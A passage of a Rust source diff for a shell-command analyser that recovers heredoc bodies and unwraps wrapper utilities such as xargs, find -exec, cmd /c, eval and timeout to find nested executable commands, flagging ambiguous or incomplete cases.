+        if !option.starts_with('-') || option == "-" {
+            return force_stdin.then_some(child_shell);
+        }
+        if option == "-c"
+            || option == "--command"
+            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('c'))
+        {
+            return None;
+        }
+        if option == "-s"
+            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('s'))
+        {
+            force_stdin = true;
+        }
+        let takes_value = matches!(
+            option.as_str(),
+            "-o" | "-O" | "--rcfile" | "--init-file" | "--startup-file"
+        ) || (child_shell == ShellType::Fish
+            && matches!(
+                option.as_str(),
+                "-C" | "--init-command" | "--features" | "--profile-startup"
+            ));
+        index += if takes_value { 2 } else { 1 };
+    }
+    Some(child_shell)
+}
+
+fn heredoc_interpreter_for_header(
+    line: &str,
+    specs: &[PosixHeredocSpec],
+    target: &PosixHeredocSpec,
+) -> Option<ShellType> {
+    if !target.stdin {
+        return None;
+    }
+    let mut masked = line.as_bytes().to_vec();
+    for spec in specs {
+        mask_non_newline(&mut masked, spec.operator_range.clone());
+    }
+    let masked = String::from_utf8(masked).ok()?;
+    let segment = tokenize::tokenize(&masked, ShellType::Posix)
+        .into_iter()
+        .find(|segment| {
+            segment.byte_range.start <= target.operator_range.start
+                && target.operator_range.start <= segment.byte_range.end
+        })
+        .or_else(|| {
+            tokenize::tokenize(&masked, ShellType::Posix)
+                .into_iter()
+                .next()
+        })?;
+    let (command, args) = resolve_wrapped_command_for_shell(&segment, ShellType::Posix)?;
+    shell_reads_heredoc_from_stdin(&command, &args)
+}
+
+fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
+    let mut recovery = PosixHeredocRecovery {
+        sanitized: raw.to_string(),
+        ..PosixHeredocRecovery::default()
+    };
+    let mut masked = raw.as_bytes().to_vec();
+    let mut cursor = 0usize;
+    let mut count = 0usize;
+    let mut header_quote = ShellLexQuote::Normal;
+    while cursor < raw.len() {
+        let header_end = raw[cursor..]
+            .find('\n')
+            .map_or(raw.len(), |offset| cursor + offset);
+        let header = raw.get(cursor..header_end).unwrap_or_default();
+        let (mut specs, unsupported, final_quote) = posix_heredoc_specs(header, header_quote);
+        header_quote = final_quote;
+        for spec in &mut specs {
+            spec.operator_range =
+                (spec.operator_range.start + cursor)..(spec.operator_range.end + cursor);
+        }
+        for spec in &specs {
+            mask_non_newline(&mut masked, spec.operator_range.clone());
+        }
+        if unsupported {
+            recovery
+                .gap
+                .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        if specs.is_empty() {
+            cursor = if header_end < raw.len() {
+                header_end + 1
+            } else {
+                raw.len()
+            };
+            continue;
+        }
+        count = count.saturating_add(specs.len());
+        if count > MAX_HEREDOCS || header_end == raw.len() {
+            recovery
+                .gap
+                .get_or_insert(ShellExecutionGap::IncompleteExecutableBody);
+            break;
+        }
+
+        let relative_specs: Vec<PosixHeredocSpec> = specs
+            .iter()
+            .map(|spec| PosixHeredocSpec {
+                delimiter: spec.delimiter.clone(),
+                quoted: spec.quoted,
+                strip_tabs: spec.strip_tabs,
+                operator_range: (spec.operator_range.start - cursor)
+                    ..(spec.operator_range.end - cursor),
+                stdin: spec.stdin,
+            })
+            .collect();
+        let mut body_cursor = header_end + 1;
+        for (spec, relative) in specs.iter().zip(relative_specs.iter()) {
+            let body_start = body_cursor;
+            let mut terminator = None;
+            while body_cursor <= raw.len() {
+                let line_end = raw[body_cursor..]
+                    .find('\n')
+                    .map_or(raw.len(), |offset| body_cursor + offset);
+                let line = raw
+                    .get(body_cursor..line_end)
+                    .unwrap_or_default()
+                    .strip_suffix('\r')
+                    .unwrap_or_else(|| raw.get(body_cursor..line_end).unwrap_or_default());
+                let candidate = if spec.strip_tabs {
+                    line.trim_start_matches('\t')
+                } else {
+                    line
+                };
+                if candidate == spec.delimiter {
+                    terminator = Some((body_cursor, line_end));
+                    break;
+                }
+                if line_end == raw.len() {
+                    break;
+                }
+                body_cursor = line_end + 1;
+            }
+            let Some((terminator_start, terminator_end)) = terminator else {
+                recovery
+                    .gap
+                    .get_or_insert(ShellExecutionGap::IncompleteExecutableBody);
+                mask_non_newline(&mut masked, body_start..raw.len());
+                body_cursor = raw.len();
+                break;
+            };
+            mask_non_newline(
+                &mut masked,
+                body_start..if terminator_end < raw.len() {
+                    terminator_end + 1
+                } else {
+                    terminator_end
+                },
+            );
+            let body = raw.get(body_start..terminator_start).unwrap_or_default();
+            if body.len() > MAX_HEREDOC_BODY_BYTES {
+                recovery
+                    .gap
+                    .get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            } else {
+                let body = if spec.strip_tabs {
+                    strip_heredoc_tabs(body)
+                } else {
+                    body.to_string()
+                };
+                if !spec.quoted {
+                    scan_unquoted_heredoc_expansions(&body, &mut recovery);
+                }
+                if let Some(shell) =
+                    heredoc_interpreter_for_header(header, &relative_specs, relative)
+                {
+                    let input = if spec.quoted {
+                        body
+                    } else {
+                        unescape_unquoted_heredoc(&body)
+                    };
+                    if !input.trim().is_empty() {
+                        recovery.bodies.push(ExecutableBody { input, shell });
+                    }
+                }
+            }
+            body_cursor = if terminator_end < raw.len() {
+                terminator_end + 1
+            } else {
+                terminator_end
+            };
+        }
+        cursor = body_cursor;
+    }
+    recovery.sanitized = String::from_utf8(masked).unwrap_or_else(|_| raw.to_string());
+    recovery
+}
+
+/// Return the shell source view with bounded heredoc payloads masked. This is
+/// a replacement view of the same root program, not a nested executable body:
+/// callers should tokenize it instead of the raw spelling so commands after a
+/// terminator remain visible without executing literal heredoc data.
+pub(crate) fn shell_execution_view<'a>(
+    raw: &'a str,
+    shell: ShellType,
+) -> std::borrow::Cow<'a, str> {
+    if shell != ShellType::Posix {
+        return std::borrow::Cow::Borrowed(raw);
+    }
+    let recovery = recover_posix_heredocs(raw);
+    if recovery.sanitized == raw {
+        std::borrow::Cow::Borrowed(raw)
+    } else {
+        std::borrow::Cow::Owned(recovery.sanitized)
+    }
+}
+
+/// Structured executable-body scan.  Most callers only need the recovered
+/// bodies and use [`executable_substitutions`]; enforcement callers also retain
+/// `gap` so ambiguous PowerShell invocation never collapses to "no body".
+pub(crate) fn executable_substitution_scan(
+    raw: &str,
+    shell: ShellType,
+) -> ExecutableSubstitutionScan {
+    let (scan_input, mut heredoc_bodies, heredoc_gap) = if shell == ShellType::Posix {
+        let recovery = recover_posix_heredocs(raw);
+        (
+            std::borrow::Cow::Owned(recovery.sanitized),
+            recovery.bodies,
+            recovery.gap,
+        )
+    } else {
+        (std::borrow::Cow::Borrowed(raw), Vec::new(), None)
+    };
+    let scan_input = scan_input.as_ref();
+    let mut scan = if shell == ShellType::PowerShell {
+        powershell_executable_substitution_scan(scan_input)
+    } else {
+        let (bodies, gap) = lexical_executable_substitutions(scan_input, shell);
+        ExecutableSubstitutionScan {
+            bodies: bodies
+                .into_iter()
+                .map(|input| ExecutableBody { input, shell })
+                .collect(),
+            gap,
+        }
+    };
+    for segment in tokenize::tokenize(scan_input, shell) {
+        if shell != ShellType::PowerShell
+            && segment.command.as_deref().is_some_and(|command| {
+                !crate::rules::command::command_word_is_statically_bound(command, shell)
+            })
+            && !(shell == ShellType::Posix
+                && segment
+                    .command
+                    .as_deref()
+                    .and_then(posix_alias_invocation_name)
+                    .is_some())
+            && !is_complete_literal_posix_brace_group(&segment, shell)
+            && !is_complete_literal_posix_function_definition(&segment, shell)
+        {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            break;
+        }
+    }
+    scan.bodies.append(&mut heredoc_bodies);
+    if scan.gap.is_none() {
+        scan.gap = heredoc_gap;
+    }
+    // Recover wrapper/heredoc boundaries before resolving aliases so POSIX
+    // dispatch state crossing any child-body boundary remains visible to the
+    // state-join guard below.
+    scan_literal_shell_wrappers(scan_input, shell, &mut scan);
+    if shell == ShellType::Posix {
+        let function_names = literal_posix_function_names(scan_input);
+        if posix_eval_crosses_dispatch_state(scan_input, &function_names) {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+    }
+    if matches!(shell, ShellType::Posix | ShellType::Fish) {
+        scan_literal_posix_aliases(scan_input, shell, &mut scan);
+    }
+    let mut seen = std::collections::HashSet::new();
+    scan.bodies
+        .retain(|body| seen.insert((body.shell, body.input.clone())));
+    scan
+}
+
+pub(crate) fn is_complete_literal_posix_function_definition(
+    segment: &tokenize::Segment,
+    shell: ShellType,
+) -> bool {
+    if shell != ShellType::Posix {
+        return false;
+    }
+    matches!(
+        parse_posix_function_definition(&segment.raw, 0),
+        PosixFunctionParse::Complete { end, .. }
+            if segment.raw.get(end..).is_some_and(|suffix| suffix.trim().is_empty())
+    )
+}
+
+fn is_complete_literal_posix_brace_group(segment: &tokenize::Segment, shell: ShellType) -> bool {
+    if shell != ShellType::Posix || segment.command.as_deref() != Some("{") {
+        return false;
+    }
+    let raw = segment.raw.trim();
+    raw.as_bytes().first() == Some(&b'{')
+        && find_shell_delimiter_close(raw, 0, ShellType::Posix).is_some_and(|close| {
+            raw.get(close + 1..)
+                .is_some_and(|suffix| suffix.trim().is_empty())
+        })
+}
+
+pub(crate) fn executable_substitutions(raw: &str, shell: ShellType) -> Vec<String> {
+    executable_substitution_scan(raw, shell)
+        .bodies
+        .into_iter()
+        .map(|body| body.input)
+        .collect()
+}
+
+const MAX_ENCODED_POWERSHELL_BODY_BYTES: usize = 256 * 1024;
+
+fn static_wrapper_word(raw: &str, shell: ShellType) -> Option<String> {
+    if !shell_word_is_proven_literal(raw, shell) {
+        return None;
+    }
+    // Cmd expands percent/delayed variables even inside quotes. A caret can
+    // also change the command passed to `/C`; normalization is deliberately not
+    // used as proof that an expansion-dependent body is static.
+    if shell == ShellType::Cmd && raw.bytes().any(|byte| matches!(byte, b'%' | b'!' | b'^')) {
+        return None;
+    }
+    Some(crate::rules::command::normalize_shell_token(raw, shell))
+}
+
+fn join_static_wrapper_words(args: &[String], shell: ShellType) -> Option<String> {
+    let mut words = Vec::with_capacity(args.len());
+    for arg in args {
+        words.push(static_wrapper_word(arg, shell)?);
+    }
+    Some(words.join(" "))
+}
+
+fn push_literal_wrapper_body(
+    args: &[String],
+    shell: ShellType,
+    child_shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    if args.is_empty() {
+        return;
+    }
+    match join_static_wrapper_words(args, shell) {
+        Some(input) if !input.trim().is_empty() => {
+            scan.bodies.push(ExecutableBody {
+                input,
+                shell: child_shell,
+            });
+        }
+        Some(_) => {}
+        None => record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody),
+    }
+}
+
+fn push_required_literal_wrapper_body(
+    args: &[String],
+    shell: ShellType,
+    child_shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    if args.is_empty() {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+    } else {
+        push_literal_wrapper_body(args, shell, child_shell, scan);
+    }
+}
+
+fn push_literal_powershell_expression(args: &[String], scan: &mut ExecutableSubstitutionScan) {
+    let Some(raw) = args.first().filter(|_| args.len() == 1) else {
+        if !args.is_empty() {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        return;
+    };
+    let trimmed = raw.trim();
+    let quoted_literal = (trimmed.starts_with('\'') && trimmed.ends_with('\''))
+        || (trimmed.starts_with('"') && trimmed.ends_with('"'));
+    let bare_literal =
+        !trimmed.is_empty() && !trimmed.bytes().any(|byte| b"(){}+$@[]|&;,".contains(&byte));
+    if !quoted_literal && !bare_literal {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    }
+    push_literal_wrapper_body(args, ShellType::PowerShell, ShellType::PowerShell, scan);
+}
+
+fn push_control_prefix_body(
+    args: &[String],
+    shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    if args.is_empty() {
+        return;
+    }
+    let body = args.join(" ");
+    let first = args.first().and_then(|arg| static_wrapper_word(arg, shell));
+    if first.is_none() {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+    } else if !body.trim().is_empty() {
+        scan.bodies.push(ExecutableBody { input: body, shell });
+    }
+}
+
+fn push_cmd_call_body(args: &[String], scan: &mut ExecutableSubstitutionScan) {
+    let Some(first) = args
+        .first()
+        .and_then(|arg| static_wrapper_word(arg, ShellType::Cmd))
+    else {
+        if !args.is_empty() {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        return;
+    };
+    let base = crate::rules::command::normalize_cmd_base(&first, ShellType::Cmd);
+    if first.starts_with(':') || base.ends_with(".bat") || base.ends_with(".cmd") {
+        // CALL transfers control to a label or a batch file whose body is not
+        // present in this command string.
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    }
+    if args
+        .iter()
+        .any(|arg| static_wrapper_word(arg, ShellType::Cmd).is_none())
+    {
+        // CALL performs an additional expansion pass; percent/delayed/caret
+        // syntax can therefore change the command boundary itself.
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    }
+    push_control_prefix_body(args, ShellType::Cmd, scan);
+}
+
+fn cmd_start_body_index(args: &[String]) -> Result<Option<usize>, ()> {
+    let mut index = 0usize;
+    if let Some(title) = args.first() {
+        let trimmed = title.trim();
+        if trimmed.starts_with('"') {
+            static_wrapper_word(title, ShellType::Cmd).ok_or(())?;
+            index += 1;
+        }
+    }
+
+    while index < args.len() {
+        let option = static_wrapper_word(&args[index], ShellType::Cmd).ok_or(())?;
+        if !option.starts_with('/') {
+            return Ok(Some(index));
+        }
+        let name = option.to_ascii_lowercase();
+        if matches!(
+            name.as_str(),
+            "/b" | "/wait"
+                | "/min"
+                | "/max"
+                | "/low"
+                | "/normal"
+                | "/high"
+                | "/realtime"
+                | "/abovenormal"
+                | "/belownormal"
+                | "/separate"
+                | "/shared"
+                | "/i"
+        ) {
+            index += 1;
+            continue;
+        }
+        if matches!(name.as_str(), "/d" | "/node" | "/affinity" | "/machine") {
+            let value = args.get(index + 1).ok_or(())?;
+            static_wrapper_word(value, ShellType::Cmd).ok_or(())?;
+            index += 2;
+            continue;
+        }
+        return Err(());
+    }
+    Ok(None)
+}
+
+fn scan_xargs_body(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    let mut index = 0usize;
+    let mut replacement: Option<String> = None;
+    while index < args.len() {
+        let Some(option) = static_wrapper_word(&args[index], shell) else {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        };
+        if option == "--" {
+            index += 1;
+            break;
+        }
+        if !option.starts_with('-') || option == "-" {
+            break;
+        }
+        if option.starts_with("--") {
+            let (name, attached) = option
+                .split_once('=')
+                .map_or((option.as_str(), None), |(name, value)| (name, Some(value)));
+            if matches!(
+                name,
+                "--null"
+                    | "--open-tty"
+                    | "--interactive"
+                    | "--no-run-if-empty"
+                    | "--verbose"
+                    | "--exit"
+                    | "--show-limits"
+                    | "--help"
+                    | "--version"
+            ) {
+                if attached.is_some() {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                index += 1;
+                continue;
+            }
+            if matches!(
+                name,
+                "--arg-file"
+                    | "--delimiter"
+                    | "--eof"
+                    | "--replace"
+                    | "--max-lines"
+                    | "--max-args"
+                    | "--max-procs"
+                    | "--max-chars"
+                    | "--process-slot-var"
+            ) {
+                let value = if let Some(value) = attached {
+                    value.to_string()
+                } else {
+                    let Some(value) = args
+                        .get(index + 1)
+                        .and_then(|value| static_wrapper_word(value, shell))
+                    else {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        return;
+                    };
+                    index += 1;
+                    value
+                };
+                if name == "--replace" {
+                    replacement = Some(value);
+                }
+                index += 1;
+                continue;
+            }
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        }
+
+        let flags = &option[1..];
+        let mut consumed_next = false;
+        let mut valid = true;
+        for (offset, flag) in flags.char_indices() {
+            if matches!(flag, '0' | 'o' | 'p' | 'r' | 't' | 'x') {
+                continue;
+            }
+            if matches!(flag, 'e' | 'i' | 'l') {
+                let attached = &flags[offset + flag.len_utf8()..];
+                if flag == 'i' {
+                    replacement = Some(if attached.is_empty() {
+                        "{}".to_string()
+                    } else {
+                        attached.to_string()
+                    });
+                }
+                break;
+            }
+            if matches!(
+                flag,
+                'a' | 'd' | 'E' | 'I' | 'L' | 'n' | 'P' | 's' | 'J' | 'R' | 'S'
+            ) {
+                let attached = &flags[offset + flag.len_utf8()..];
+                let value = if attached.is_empty() {
+                    consumed_next = true;
+                    args.get(index + 1)
+                        .and_then(|value| static_wrapper_word(value, shell))
+                } else {
+                    Some(attached.to_string())
+                };
+                let Some(value) = value else {
+                    valid = false;
+                    break;
+                };
+                if flag == 'I' || flag == 'J' {
+                    replacement = Some(value);
+                }
+                break;
+            }
+            valid = false;
+            break;
+        }
+        if !valid {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        }
+        index += if consumed_next { 2 } else { 1 };
+    }
+
+    let Some(first) = args.get(index) else {
+        // With no utility operand, xargs executes its fixed default `echo`.
+        return;
+    };
+    let Some(first_static) = static_wrapper_word(first, shell) else {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    };
+    if replacement
+        .as_deref()
+        .is_some_and(|replacement| !replacement.is_empty() && first_static.contains(replacement))
+    {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    }
+    push_control_prefix_body(args.get(index..).unwrap_or_default(), shell, scan);
+}
+
+fn scan_find_exec_bodies(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    let mut index = 0usize;
+    while index < args.len() {
+        let Some(primary) = static_wrapper_word(&args[index], shell) else {
+            index += 1;
+            continue;
+        };
+        if !matches!(primary.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
+            index += 1;
+            continue;
+        }
+        let body_start = index + 1;
+        let mut end = body_start;
+        while end < args.len() {
+            // `find -exec ... \;` reaches the process as a literal `;` after
+            // the outer shell removes its deterministic escape.  The stricter
+            // wrapper-body helper rejects every backslash, so use the command
+            // word proof for this syntax token specifically.
+            let terminator =
+                crate::rules::command::command_word_is_statically_bound(&args[end], shell)
+                    .then(|| crate::rules::command::normalize_shell_token(&args[end], shell));
+            if terminator
+                .as_deref()
+                .is_some_and(|word| word == ";" || word == "+")
+            {
+                break;
+            }
+            end += 1;
+        }
+        if end == args.len() {
+            record_shell_execution_gap(scan, ShellExecutionGap::IncompleteExecutableBody);
+            return;
+        }
+        if body_start == end {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        } else {
+            push_control_prefix_body(&args[body_start..end], shell, scan);
+        }
+        if matches!(primary.as_str(), "-execdir" | "-okdir") {
+            // The effective cwd is selected per match; cwd-sensitive
+            // consumers cannot reuse the caller's repository snapshot.
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        index = end + 1;
+    }
+}
+
+fn scan_cmd_for_f_command(args: &[String], scan: &mut ExecutableSubstitutionScan) {
+    if !args.iter().any(|arg| {
+        static_wrapper_word(arg, ShellType::Cmd).is_some_and(|arg| arg.eq_ignore_ascii_case("/f"))
+    }) {
+        return;
+    }
+    let Some(in_index) = args.iter().position(|arg| {
+        static_wrapper_word(arg, ShellType::Cmd).is_some_and(|arg| arg.eq_ignore_ascii_case("in"))
+    }) else {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    };
+    let do_index = args
+        .iter()
+        .enumerate()
+        .skip(in_index + 1)
+        .find_map(|(index, arg)| {
+            static_wrapper_word(arg, ShellType::Cmd)
+                .is_some_and(|arg| arg.eq_ignore_ascii_case("do"))
+                .then_some(index)
+        })
+        .unwrap_or(args.len());
+    let set = args[in_index + 1..do_index].join(" ");
+    let set = set.trim();
+    let body = set
+        .strip_prefix("('")
+        .and_then(|value| value.strip_suffix("')"))
+        .or_else(|| {
+            set.strip_prefix("(`")
+                .and_then(|value| value.strip_suffix("`)"))
+        });
+    if let Some(body) = body {
+        if body.trim().is_empty() {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        } else {
+            scan.bodies.push(ExecutableBody {
+                input: body.to_string(),
+                shell: ShellType::Cmd,
+            });
+        }
+    } else if set.starts_with("('") || set.starts_with("(`") {
+        record_shell_execution_gap(scan, ShellExecutionGap::IncompleteExecutableBody);
+    }
+}
+
+fn scan_cmd_cli_body(
+    args: &[String],
+    outer_shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    for (index, arg) in args.iter().enumerate() {
+        let trimmed = arg.trim();
+        let lower = trimmed.to_ascii_lowercase();
+        let is_command_option = lower.starts_with("/c") || lower.starts_with("/k");
+        if !is_command_option {
+            continue;
+        }
+        if trimmed
+            .get(..2)
+            .and_then(|option| static_wrapper_word(option, outer_shell))
+            .is_none()
+        {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        }
+        let mut body = Vec::new();
+        if trimmed.len() > 2 {
+            if let Some(attached) = trimmed.get(2..) {
+                body.push(attached.to_string());
+            }
+        }
+        body.extend_from_slice(args.get(index + 1..).unwrap_or_default());
+        if let Some(input) = join_static_wrapper_words(&body, outer_shell) {
+            if input.trim().is_empty() {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            } else {
+                scan.bodies.push(ExecutableBody {
+                    input,
+                    shell: ShellType::Cmd,
+                });
+            }
+        } else if outer_shell == ShellType::Cmd {
+            // Interactive Cmd FOR variables (`%i`) are syntax, not an
+            // environment expansion. Preserve that one proven variable while
+            // rejecting every other percent/delayed/caret expansion surface.
+            let input = body
+                .iter()
+                .map(|word| crate::rules::command::normalize_shell_token(word, ShellType::Cmd))
+                .collect::<Vec<_>>()
+                .join(" ");
+            let for_body = tokenize::tokenize(&input, ShellType::Cmd)
+                .into_iter()
+                .next()
+                .filter(|segment| {
+                    segment.command.as_deref().is_some_and(|command| {
+                        crate::rules::command::normalize_cmd_base(command, ShellType::Cmd) == "for"
+                    })
+                })
+                .and_then(|segment| {
+                    cmd_for_body_index(&segment.args)?;
+                    let loop_var = segment.args.iter().find_map(|arg| {
+                        let normalized =
+                            crate::rules::command::normalize_shell_token(arg, ShellType::Cmd);
+                        let variable = normalized
+                            .strip_prefix("%%")
+                            .or_else(|| normalized.strip_prefix('%'))?;
+                        (variable.len() == 1
+                            && variable
+                                .chars()
+                                .all(|character| character.is_ascii_alphabetic()))
+                        .then_some(normalized)
+                    })?;
+                    let remaining = input.replace(loop_var.as_str(), "");
+                    (!remaining
+                        .bytes()
+                        .any(|byte| matches!(byte, b'%' | b'!' | b'^')))
+                    .then_some(input.clone())
+                });
+            if let Some(input) = for_body {
+                scan.bodies.push(ExecutableBody {
+                    input,
+                    shell: ShellType::Cmd,
+                });
+            } else {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+        } else {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        return;
+    }
+}
+
+fn scan_posix_builtin(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    let mut index = 0usize;
+    if args
+        .first()
+        .and_then(|arg| static_wrapper_word(arg, shell))
+        .as_deref()
+        == Some("--")
+    {
+        index = 1;
+    } else if args
+        .first()
+        .and_then(|arg| static_wrapper_word(arg, shell))
+        .is_some_and(|arg| arg.starts_with('-') && arg != "-")
+    {
+        if args.len() > 1 {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        return;
+    }
+    let Some(target) = args
+        .get(index)
+        .and_then(|arg| static_wrapper_word(arg, shell))
+    else {
+        if !args.is_empty() {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        return;
+    };
+    let target = crate::rules::command::normalize_cmd_base(&target, shell);
+    match target.as_str() {
+        "eval" => push_literal_wrapper_body(
+            args.get(index + 1..).unwrap_or_default(),
+            shell,
+            shell,
+            scan,
+        ),
+        "." | "source" => {
+            if has_process_substitution_arg(args.get(index + 1..).unwrap_or_default()) {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+        }
+        "exec" | "command" | "builtin" => {
+            // Preserve the delegated builtin itself so the canonical wrapper
+            // parser handles its option grammar on the recursive pass.
+            push_control_prefix_body(args.get(index..).unwrap_or_default(), shell, scan);
+        }
+        _ => {}
+    }
+}
+
+fn push_static_child_from(
+    args: &[String],
+    index: usize,
+    shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    if index < args.len() {
+        push_control_prefix_body(&args[index..], shell, scan);
+    }
+}
+
+fn scan_posix_delegation_utility(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+    scan: &mut ExecutableSubstitutionScan,
+) {
+    let mut index = 0usize;
+    match command {
+        "noglob" | "nocorrect" => {
+            push_static_child_from(args, 0, shell, scan);
+        }
+        "repeat" => {
+            let Some(count) = args.first().and_then(|arg| static_wrapper_word(arg, shell)) else {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                return;
+            };
+            if !count.chars().all(|ch| ch.is_ascii_digit()) {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                return;
+            }
+            push_static_child_from(args, 1, shell, scan);
+        }
+        "nice" => {
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if option == "-n" || option == "--adjustment" {
+                    if args
+                        .get(index + 1)
+                        .and_then(|arg| static_wrapper_word(arg, shell))
+                        .is_none()
+                    {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        return;
+                    }
+                    index += 2;
+                    continue;
+                }
+                if option.starts_with("--adjustment=")
+                    || option
+                        .strip_prefix('-')
+                        .is_some_and(|value| !value.is_empty() && value.parse::<i32>().is_ok())
+                {
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "--help" | "--version") {
+                    return;
+                }
+                if option.starts_with('-') {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                break;
+            }
+            push_static_child_from(args, index, shell, scan);
+        }
+        "setsid" => {
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if matches!(
+                    option.as_str(),
+                    "-c" | "-f" | "-w" | "--ctty" | "--fork" | "--wait"
+                ) {
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "-h" | "-V" | "--help" | "--version") {
+                    return;
+                }
+                if option.starts_with('-') {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                break;
+            }
+            push_static_child_from(args, index, shell, scan);
+        }
+        "timeout" => {
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if matches!(option.as_str(), "-k" | "--kill-after" | "-s" | "--signal") {
+                    if args
+                        .get(index + 1)
+                        .and_then(|arg| static_wrapper_word(arg, shell))
+                        .is_none()
+                    {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        return;
+                    }
+                    index += 2;
+                    continue;
+                }
+                if option.starts_with("--kill-after=") || option.starts_with("--signal=") {
+                    index += 1;
+                    continue;
+                }
+                if matches!(
+                    option.as_str(),
+                    "--preserve-status" | "--foreground" | "-v" | "--verbose"
+                ) {
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "--help" | "--version") {
+                    return;
+                }
+                if option.starts_with('-') {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                break;
+            }
+            if args
+                .get(index)
+                .and_then(|arg| static_wrapper_word(arg, shell))
+                .is_none()
+            {
+                if index < args.len() {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                return;
+            }
+            push_static_child_from(args, index.saturating_add(1), shell, scan);
+        }
+        "stdbuf" => {
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if matches!(option.as_str(), "-i" | "-o" | "-e") {
+                    if args
+                        .get(index + 1)
+                        .and_then(|arg| static_wrapper_word(arg, shell))
+                        .is_none()
+                    {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        return;
+                    }
+                    index += 2;
+                    continue;
+                }
+                if option.starts_with("--input=")
+                    || option.starts_with("--output=")
+                    || option.starts_with("--error=")
+                    || (option.len() > 2
+                        && matches!(option.as_bytes().get(1), Some(b'i' | b'o' | b'e')))
+                {
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "--help" | "--version") {
+                    return;
+                }
+                if option.starts_with('-') {
